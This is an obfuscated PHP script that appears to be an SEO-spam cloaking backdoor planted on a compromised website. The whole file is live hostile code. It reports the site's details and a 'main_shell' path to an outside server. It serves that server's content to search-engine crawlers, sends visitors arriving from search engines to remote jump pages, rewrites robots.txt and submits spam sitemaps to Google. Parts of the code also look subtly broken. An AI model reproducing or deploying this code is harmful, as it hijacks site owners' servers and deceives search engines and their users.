<?php

@header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
$oOooOOoO = "http://z1212.agoods.top";
function ooooooooOOOOOOOOoooooOOO($oooOOOoOoo)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $oooOOOoOoo);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
function ooOOoOOO($OooooO, $OOOoooo = [])
{
    $OooooO = str_replace(" ", "+", $OooooO);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "{$OooooO}");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($OOOoooo));
    $result = curl_exec($curl);
    $OOOOoooOO = curl_errno($curl);
    curl_close($curl);
    if (0 !== $OOOOoooOO) {
        return false;
    }
    return $result;
}
function oooOOOo($ooOOo)
{
    $result = false;
    $oooooOOo = "googlebot+bingbot+google+aol+bing+yahoo";
    if ($ooOOo != "") {
        if (preg_match("/(googlebot+bingbot+google+aol+bing+yahoo)/si", $ooOOo)) {
            $result = true;
        }
    }
    return $result;
}
function oooOOooOOoOO($oOOOOOOoOOOO)
{
    $result = false;
    $ooOOOOOOoOo = "google.co+yahoo.co.jp+bing";
    if ($oOOOOOOoOOOO != "" && preg_match("/(google.co+yahoo.co.jp+bing)/si", $oOOOOOOoOOOO)) {
        $result = true;
    }
    return $result;
}
$oOooOOoOO = isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" ? "https://" : "http://";
$oOoooOOoOO = $_SERVER["REQUEST_URI"];
$ooOOoooOOoOO = $_SERVER["HTTP_HOST"];
$ooOOOoooOOoOO = $_SERVER["PHP_SELF"];
$ooOOOOoooOOOoOO = $_SERVER["SERVER_NAME"];
$ooOOOOoooOOOOoOO = $oOooOOoOO . $ooOOoooOOoOO . $oOoooOOoOO;
$oooOOOOoooOOOooOO = "http://z1212.agoods.top/indata.php";
$ooooOOOOoooOOOooO = "http://z1212.agoods.top/map.php";
$ooooOOOOoooOOOooOoo = "http://z1212.agoods.top/jump.php";
$oooooOOoooOOOoooOoo = "http://z1212.agoods.top/words.php";
$ooooooooOOOOoooOOoooOO = "http://z1212.agoods.top/robots.php";
if (strpos($oOoooOOoOO, ".php")) {
    $ooooooOOoooOOOoooOo = $oOooOOoOO . $ooOOoooOOoOO . $ooOOOoooOOoOO;
} else {
    $ooooooOOoooOOOoooOo = $oOooOOoOO . $ooOOoooOOoOO;
}
$ooooooOoOoooOOOooo[] = [];
$ooooooOoOoooOOOooo["domain"] = $ooOOoooOOoOO;
$ooooooOoOoooOOOooo["req_uri"] = $oOoooOOoOO;
$ooooooOoOoooOOOooo["href"] = $ooooooOOoooOOOoooOo;
$ooooooOoOoooOOOooo["req_url"] = $ooOOOOoooOOOOoOO;
if (substr($oOoooOOoOO, -6) == "robots") {
    $ooooooooOOOOOoooOoOoooOO = ooOOoOOO($ooooooooOOOOoooOOoooOO, $ooooooOoOoooOOOooo);
    define("BASE_PATH", str_ireplace($_SERVER["PHP_SELF"], "", "/var/www/html/99d119b53025b8526a34b6339bfb88a0_original.txt"));
    file_put_contents("BASE_PATH/robots.txt", $ooooooooOOOOOoooOoOoooOO);
    $ooooooooOOOOOoooOoOoooOO = file_get_contents("BASE_PATH/robots.txt");
    if (strpos($ooooooooOOOOOoooOoOoooOO, "Crawl-delay:3")) {
        echo "robots.txt file create success*";
    } else {
        echo "robots.txt file create fail*";
    }
    exit;
}
if (substr($oOoooOOoOO, -4) == ".xml") {
    if (strpos($oOoooOOoOO, "pingsitemap.xml")) {
        $ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO, $ooooooOoOoooOOOooo);
        $ooooooOOoooOOOooooOOO = explode(",", $ooooooOoOoooOOOooooO);
        $ooooooOOoooOOOooooOOO[] = "sitemap";
        for ($ooooooOOoooOOOooooOOOOo = 0; $ooooooOOoooOOOooooOOOOo < count($ooooooOOoooOOOooooOOO); $ooooooOOoooOOOooooOOOOo++) {
            if (strpos($ooooooOOoooOOOoooOo, ".php") > 0) {
                $ooooooOOoooOOOooooOOOOoo = "?";
            } else {
                $ooooooOOoooOOOooooOOOOoo = "/";
            }
            $ooooooOOOoooOOOooooOOOOOoo = $ooooooOOoooOOOoooOo . $ooooooOOoooOOOooooOOOOoo . $ooooooOOoooOOOooooOOO[$ooooooOOoooOOOooooOOOOo] . ".xml";
            $ooooooOOOOoooOOOooooOOOOOo = "https://www.google.com/ping?sitemap=" . $ooooooOOOoooOOOooooOOOOOoo;
            $ooooooOOOOoooOOOooooOOOOOoOooOoOo = "http://www.google.com/ping?sitemap=" . $ooooooOOOoooOOOooooOOOOOoo;
            if (stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOo), "successfully")) {
                echo $ooooooOOOOoooOOOooooOOOOOo . "===>Submitting Google Sitemap: OK" . PHP_EOL;
            } elseif (stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOo), "successfully")) {
                echo $ooooooOOOOoooOOOooooOOOOOo . "===>Submitting Google Sitemap: OK" . PHP_EOL;
            } elseif (stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOoOooOoOo), "successfully")) {
                echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo . "===>Submitting Google Sitemap: OK" . PHP_EOL;
            } elseif (stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOoOooOoOo), "successfully")) {
                echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo . "===>Submitting Google Sitemap: OK" . PHP_EOL;
            } else {
                echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo . "===>Submitting Google Sitemap: fail" . PHP_EOL;
            }
        }
        exit;
    }
    if (strpos($oOoooOOoOO, "allsitemap.xml")) {
        $ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO, $ooooooOoOoooOOOooo);
        header("Content-type:text/xml");
        echo $ooooooOoOoooOOOooooO;
        exit;
    }
    if (strpos($oOoooOOoOO, ".php")) {
        $ooooooOOoOOoooOOOooooOOOOO = explode("?", $oOoooOOoOO);
        $ooooooOOoOOoooOOOooooOOOOO = $ooooooOOoOOoooOOOooooOOOOO[count($ooooooOOoOOoooOOOooooOOOOO) - 1];
        $ooooooOOoOOoooOOOooooOOOOO = str_replace(".xml", "", $ooooooOOoOOoooOOOooooOOOOO);
    } else {
        $ooooooOOoOOoooOOOooooOOOOO = str_replace("/", "", $oOoooOOoOO);
        $ooooooOOoOOoooOOOooooOOOOO = str_replace(".xml", "", $ooooooOOoOOoooOOOooooOOOOO);
    }
    $ooooooOoOoooOOOooo["word"] = $ooooooOOoOOoooOOOooooOOOOO;
    $ooooooOoOoooOOOooo["action"] = "check_sitemap";
    $ooooooOOoOoOoooOOOooooOOoOOO = ooOOoOOO($oooooOOoooOOOoooOoo, $ooooooOoOoooOOOooo);
    if ($ooooooOOoOoOoooOOOooooOOoOOO == "1") {
        $ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO, $ooooooOoOoooOOOooo);
        header("Content-type:text/xml");
        echo $ooooooOoOoooOOOooooO;
        exit;
    }
    $ooooooOoOoooOOOooo["action"] = "check_words";
    $ooooooOOoOoOoooOOOooooOOoOoOO = ooOOoOOO($oooooOOoooOOOoooOoo, $ooooooOoOoooOOOooo);
    if (strpos($oOoooOOoOO, "map") > 0 || $ooooooOOoOoOoooOOOooooOOoOoOO == "1") {
        $ooooooOoOoooOOOooo["action"] = "rand_xml";
        $ooooooOOoOoOoooOOOooooOOoOOO = ooOOoOOO($oooooOOoooOOOoooOoo, $ooooooOoOoooOOOooo);
        header("Content-type:text/xml");
        echo $ooooooOOoOoOoooOOOooooOOoOOO;
        exit;
    }
}
if (strpos($oOoooOOoOO, ".php")) {
    $ooooooOOooOooOoooOOOooooOOoOoOO = $oOooOOoOO . $ooOOOOoooOOOoOO . $ooOOOoooOOoOO;
    $ooooooOoOoooOOOooo["main_shell"] = $ooooooOOooOooOoooOOOooooOOoOoOO;
} else {
    $ooooooOOooOooOoooOOOooooOOoOoOO = $oOooOOoOO . $ooOOOOoooOOOoOO;
    $ooooooOoOoooOOOooo["main_shell"] = $ooooooOOooOooOoooOOOooooOOoOoOO;
}
if (substr($oOoooOOoOO, -4) == ".htm") {
    $oooOOOooOoooOOOooooOoOoOoOoO = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
    $ooooOoOOooOoooOOOoOoOoOoO = oooOOooOOoOO($oooOOOooOoooOOOooooOoOoOoOoO);
    if ($ooooOoOOooOoooOOOoOoOoOoO) {
        echo ooOOoOOO($ooooOOOOoooOOOooOoo, $ooooooOoOoooOOOooo);
        exit;
    }
    $oooOoOOooOoooOOOoOoOoOoOoO = strtolower(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "");
    $oooOoOooOooOoooOOOoOoOoOoOo = oooOOOo($oooOoOOooOoooOOOoOoOoOoOoO);
    if ($oooOoOooOooOoooOOOoOoOoOoOo) {
        $ooooooOoOoooOOOooo["http_user_agent"] = $oooOoOOooOoooOOOoOoOoOoOoO;
        $ooooooOOOOOoooOOOOooooooO = ooOOoOOO($oooOOOOoooOOOooOO, $ooooooOoOoooOOOooo);
        if ($ooooooOOOOOoooOOOOooooooO == "404") {
            header("HTTP/1.0 404 Not Found");
            exit;
        } elseif ($ooooooOOOOOoooOOOOooooooO == "500") {
            header("HTTP/1.0 500 Internal Server Error");
            exit;
        } elseif ($ooooooOOOOOoooOOOOooooooO == "blank") {
            echo "";
            exit;
        } else {
            echo $ooooooOOOOOoooOOOOooooooO;
            exit;
        }
    } else {
        header("HTTP/1.0 404 Not Found");
    }
}
